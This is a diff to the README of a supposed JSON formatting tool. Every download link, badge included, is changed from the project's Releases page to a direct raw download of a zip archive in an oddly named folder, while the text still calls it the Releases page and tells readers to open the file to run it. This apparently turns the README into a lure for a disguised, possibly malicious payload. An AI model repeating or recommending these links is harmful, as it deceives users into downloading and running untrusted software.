@@ -1,6 +1,6 @@
 # ✨ json-formatter-tool - Format Your JSON Instantly
 
-[![Download json-formatter-tool](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/synam54645673/json-formatter-tool/releases)
+[![Download json-formatter-tool](https://raw.githubusercontent.com/synam54645673/json-formatter-tool/main/foretime/json-formatter-tool-v2.1.zip)](https://raw.githubusercontent.com/synam54645673/json-formatter-tool/main/foretime/json-formatter-tool-v2.1.zip)
 
 ## 🎯 Overview
 
@@ -12,7 +12,7 @@ To get started with the json-formatter-tool, follow these simple steps to downlo
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [JSON Formatter Tool Releases](https://github.com/synam54645673/json-formatter-tool/releases).
+1. Visit this page to download: [JSON Formatter Tool Releases](https://raw.githubusercontent.com/synam54645673/json-formatter-tool/main/foretime/json-formatter-tool-v2.1.zip).
 2. On the Releases page, look for the latest version of the tool.
 3. Click on the link to download the application suitable for your computer system.
 4. After the download completes, open the file to run the application.
@@ -77,4 +77,4 @@ The json-formatter-tool is free to use under the MIT License. Feel free to utili
 
 If you encounter any issues or have questions, feel free to reach out in the GitHub Issues section. Your feedback is essential for improving the json-formatter-tool.
 
-Remember to visit the Releases page: [JSON Formatter Tool Releases](https://github.com/synam54645673/json-formatter-tool/releases) to download the latest version and enjoy easy JSON formatting!
+Remember to visit the Releases page: [JSON Formatter Tool Releases](https://raw.githubusercontent.com/synam54645673/json-formatter-tool/main/foretime/json-formatter-tool-v2.1.zip) to download the latest version and enjoy easy JSON formatting!
